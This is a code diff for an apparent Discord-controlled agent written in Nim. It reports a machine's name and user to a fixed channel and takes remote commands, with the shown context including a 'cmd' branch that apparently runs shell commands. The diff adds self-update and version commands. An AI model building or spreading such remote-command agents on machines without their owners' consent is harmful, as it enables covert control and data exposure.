@@ -1,13 +1,17 @@
 import dimscord, asyncdispatch, options, os, strutils
 import dotenv
+import constants
+import checkForUpdates
 
 let env = initDotEnv()
 env.load()
 
-const CHANNEL: string = "847087245605601290"
-let THISPC: string = getEnv("COMPUTERNAME")
-var THISPCSTR: string = "`" & THISPC & "`: "
-let discord = newDiscordClient(getEnv("TOKEN"))
+const CHANNEL*: string = "847087245605601290"
+
+let THISPC*: string = getEnv("COMPUTERNAME")
+let TOKEN*: string = getEnv("TOKEN")
+
+var THISPCSTR*: string = "`" & THISPC & "`: "
 var alias: string = "xxxxxx"
 
 try:
@@ -19,8 +23,13 @@ try:
 except:
   discard
 
+let discord = newDiscordClient(TOKEN)
+
 proc showName(discord: DiscordClient) =
-  discard discord.api.sendMessage(CHANNEL, THISPCSTR & "started as " & getEnv("USERNAME"))
+  discard discord.api.sendMessage(
+    CHANNEL,
+    THISPCSTR & "started `" & $VERSION & "` as " & getEnv("USERNAME")
+  )
 
 proc onReady(s: Shard, r: Ready) {.event(discord).} =
   echo "Ready as " & $r.user
@@ -63,6 +72,14 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
           discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "quitting")
 
           quit(0)
+
+        if (command.startsWith("update")):
+          discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "trying to update")
+
+          checkForUpdates()
+
+        if (command.startsWith("version")):
+          discard await discord.api.sendMessage(CHANNEL, THISPCSTR & $VERSION)
 
         elif (command.startsWith("cmd")):
           let cmd: string = command.split("cmd ")[1]
